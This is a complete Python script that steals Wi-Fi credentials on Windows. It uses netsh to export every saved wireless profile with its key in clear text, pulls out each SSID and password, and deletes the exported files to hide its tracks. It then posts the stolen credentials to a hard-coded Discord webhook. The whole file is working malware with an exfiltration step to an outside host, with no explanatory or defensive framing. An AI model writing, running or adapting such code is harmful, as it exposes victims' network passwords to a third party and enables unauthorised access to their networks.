import subprocess, os, sys, requests
import xml.etree.ElementTree as ET

url = 'https://discord.com/api/webhooks/1005181355619004517/7yrFrCV65AxWeliU880pye3EyB15ccU4Yp1Va5Ny-BXQa8y9YYG2joKzmCWW5211RGly'
wifi_files = []
payload = {"SSID":[], "Password":[]}


command_output = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output = True).stdout.decode()

path = os.getcwd()

for filename in os.listdir(path):
    if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
        wifi_files.append(filename)

if len(wifi_files) >= 1:
    for file in wifi_files:
        tree = ET.parse(file)
        root = tree.getroot()
        SSID = root[0].text
        password = root[4][0][1][2].text
        payload["SSID"].append(SSID)
        payload["Password"].append(password)
        os.remove(file)
    print("Wi-Fi profiles found")
else:
        print("No Wi-Fi profiles found")
        sys.exit()

payload_str = " & ".join("%s=%s" % (k,v) for k,v in payload.items())
r = requests.post(url, params='format=json', data=payload_str)
